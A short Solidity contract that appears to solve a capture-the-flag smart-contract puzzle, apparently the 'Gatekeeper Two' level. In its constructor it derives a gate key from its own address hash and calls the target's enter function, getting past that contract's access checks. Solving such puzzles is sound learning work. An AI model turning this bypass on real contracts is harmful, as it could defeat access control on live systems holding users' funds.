// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwoAttack {
    constructor(address gatekeepertwoaddress) public {
        // Get the gateKey. We use de keccak256 hashing function to get the address
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
            (uint64(0) - 1);
        gatekeepertwoaddress.call(
            abi.encodeWithSignature("enter(bytes8)", bytes8(gateKey))
        );
    }
}
